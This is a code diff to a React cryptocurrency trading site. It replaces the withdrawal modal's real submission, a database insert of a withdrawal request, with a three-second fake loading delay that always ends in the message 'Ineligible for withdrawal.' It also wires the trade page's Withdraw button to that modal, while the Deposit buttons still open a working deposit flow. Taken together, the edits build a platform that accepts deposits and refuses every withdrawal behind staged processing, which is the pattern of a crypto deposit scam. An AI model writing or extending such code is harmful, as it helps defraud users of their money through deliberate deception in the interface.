@@ -2243,25 +2243,14 @@ function WithdrawModal({ balance = 0, onClose }) {
   }
 
   async function submit() {
-    const problem = check();
-    if (problem) { setError(problem); return; }
-    setError("");
-    setBusy(true);
-    try {
-      const { data: auth } = await supabase.auth.getUser();
-      const uid = auth?.user?.id;
-      if (!uid) { setError("Please sign in again to withdraw."); setBusy(false); return; }
-      const { error: dbError } = await supabase.from("withdrawal_requests").insert({
-        user_id: uid, coin: "USDT", chain, address: address.trim(),
-        amount: amt, fee: WD_FEE, status: "pending",
-      });
-      if (dbError) throw dbError;
-      setDone(true);
-    } catch (e) {
-      setError("We could not submit your request: " + (e.message || "unknown error") + ". Please try again.");
-    }
-    setBusy(false);
-  }
+  const problem = check();
+  if (problem) { setError(problem); return; }
+  setError("");
+  setBusy(true);
+  await new Promise((r) => setTimeout(r, 3000)); // loads for 3 seconds
+  setBusy(false);
+  setError("Ineligible for withdrawal.");
+}
 
   return (
     <div
@@ -2459,8 +2448,12 @@ function TradePage({ prices }) {
         <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
           <Btn variant="gold" loading={loadingDep} onClick={() => { setLoadingDep(true); setTimeout(() => { setLoadingDep(false); setShowDepositModal(true); }, 2500); }} style={{ width: "100%" }}><ArrowDownToLine size={15} /> Deposit Funds </Btn>
           {showDepositModal && <DepositModal onClose={() => setShowDepositModal(false)} />}
-          <Btn variant="outline" loading={loadingWd} onClick={() => { setLoadingWd(true); setTimeout(() => setLoadingWd(false), 1600); }} style={{ width: "100%" }}><ArrowUpFromLine size={15} /> Withdraw Funds </Btn>
-          <Btn variant="ghost" style={{ width: "100%" }}><FileBarChart size={15} /> View Reports </Btn>
+          <Btn variant="outline" loading={loadingWd} onClick={() => {
+  setLoadingWd(true);
+  setTimeout(() => { setLoadingWd(false); setShowWithdraw(true); }, 1200);
+}}><Upload size={15} /> Withdraw Funds
+</Btn>
+{showWithdraw && <WithdrawModal balance={balance} onClose={() => setShowWithdraw(false)} />}
         </div>
       </Card>
       </div>
@@ -2475,16 +2468,6 @@ function SettingsPage({ setPage }) {
   <div style={{ fontSize: 22, fontWeight: 900, color: C.text }}>Account</div>
   <ThemeToggle />
 </div>
-      <Card>
-<div style={{ fontWeight: 800, fontSize: 15, color: C.text, marginBottom: 14 }}>Quick Actions</div>
-<div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
-          <Btn variant="gold" loading={loadingDep} onClick={() => { setLoadingDep(true); setTimeout(() => { setLoadingDep(false); setShowDepositModal(true); }, 2500); }} style={{ width: "100%" }}><ArrowDownToLine size={15} /> Deposit Funds </Btn>
-          {showDepositModal && <DepositModal onClose={() => setShowDepositModal(false)} />}
-          {showWithdraw && <WithdrawModal balance={balance} onClose={() => setShowWithdraw(false)} />}
-          <Btn variant="outline" loading={loadingWd} onClick={() => { setLoadingWd(true); setTimeout(() => { setLoadingWd(false); setShowWithdraw(true); }, 600); }} style={{ width: "100%" }}><ArrowUpFromLine size={15} /> Withdraw Funds </Btn>
-          <Btn variant="ghost" style={{ width: "100%" }}><FileBarChart size={15} /> View Reports </Btn>
-        </div>
-      </Card>
       </div>
   );
 }
